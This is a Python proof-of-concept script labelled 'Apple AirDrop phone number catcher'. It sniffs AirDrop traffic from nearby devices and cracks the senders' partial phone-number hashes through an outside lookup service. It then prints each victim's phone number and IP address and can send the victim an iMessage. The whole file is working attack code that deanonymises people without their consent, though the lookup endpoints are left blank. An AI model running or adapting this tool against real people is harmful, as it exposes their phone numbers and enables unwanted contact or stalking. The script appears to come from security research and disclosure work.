#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway


# !!!!!!!!
# Don't forget to install https://github.com/seemoo-lab/owl before using this script
# 1. Install owl
# 2. iwconfig wlan0 mode monitor
# 3. ip link set wlan0 up
# 4. owl -i wlan0 -N

import time
import json
import hashlib
import argparse
import requests
from threading import Thread, Timer
from opendrop2.cli import AirDropCli
from opendrop2.server import get_devices
from requests.packages.urllib3.exceptions import InsecureRequestWarning

help_desc = '''
Apple AirDrop phone number catcher
---chipik
'''
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-c', '--check_hash', action='store_true', help='Get phone number by hash')
parser.add_argument('-n', '--check_phone', action='store_true', help='Get user info by phone number (TrueCaller/etc)')
parser.add_argument('-m', '--message', action='store_true', help='Send iMessage to the victim')
args = parser.parse_args()

base_url = ''  # URL to hash2phone matcher
imessage_url = ''  # URL to iMessage sender (sorry, but we did some RE for that :) )
verify = False
results = {}

if args.message:
    if not imessage_url:
        print("You have to specify imessage_url if you want to send iMessages to the victim")
        exit(1)
if args.check_phone:
    # import from TrueCaller API lib (sorry, but we did some RE for that :))
    print("Sorry, but we don't provide this functionality as a part of this PoC")
    exit(1)
if args.check_hash:
    if not base_url:
        print("You have to specify base_url if you want to match hashes to phones")
        exit(1)


def get_phone(hash):
    global phone_number_info
    r = requests.get(base_url, params={'hash': hash}, verify=verify)
    if r.status_code == 200:
        result = r.json()
        return result['candidates']
    else:
        print("Something wrong! Status: {}".format(r.status_code))


def start_listetninig():
    print("[*] Looking for AirDrop senders...")
    AirDropCli(["receive"])


def get_hash(data):
    return hashlib.sha256(data.encode('utf-8')).hexdigest()


def get_names(phone, lat=False):
    name, carrier, region = get_number_info_TrueCaller('+{}'.format(phone), lat)
    return name, carrier, region


def send_imessage(tel, text):
    data = {"token": "",
            "destination": "+{}".format(tel),
            "text": text
            }
    r = requests.post(imessage_url + '/imessage', data=json.dumps(data), verify=verify)
    if r.status_code == 200:
        print("[*] iMessage sent")
    elif r.status_code == 404:
        print("[*] iMessage failed")
    else:
        print(r.content)
        print("Something wrong! Status: {}".format(r.status_code))


thread2 = Thread(target=start_listetninig, args=())
thread2.daemon = True
thread2.start()

# OMG i'm a programmer loop here
while 1:
    time.sleep(5)
    devs = get_devices()
    if len(devs):
        for dev in devs:
            if dev["phone"] not in results.keys():
                if dev["hash"]:
                    if args.check_hash:
                        ph_candidates = get_phone(dev["hash"][:6])
                        for candidate in ph_candidates:
                            if dev["hash"] == get_hash(candidate):
                                dev["phone"] = candidate
                                results[dev["phone"]] = dev
                                if args.check_phone:
                                    name, carrier, region = get_names(dev["phone"], True)
                                    print(
                                        "Someone with phone number \033[92m{} ({})\033[0m and ip \033[92m{}\033[0m has tried to use AirDrop".format(
                                            dev["phone"], name, dev["ip"]))
                                    if args.message:
                                        send_imessage(dev["phone"],
                                                      "Hi, {}! Have you tried to send smth via AirDrop?".format(name))
                                else:
                                    print(
                                        "Someone with phone number \033[92m{}\033[0m and ip \033[92m{}\033[0m has tried to use AirDrop".format(
                                            dev["phone"], dev["ip"]))
                                    if args.message:
                                        send_imessage(dev["phone"],
                                                      "Hi {}! Have you tried to send smth via AirDrop?".format(
                                                          dev["phone"]))
                    else:
                        print("Someone with phone number hash \033[92m{}\033[0m has tried to use AirDrop".format(
                            dev["hash"]))

                else:
                    print("We've got an empty hash :/")
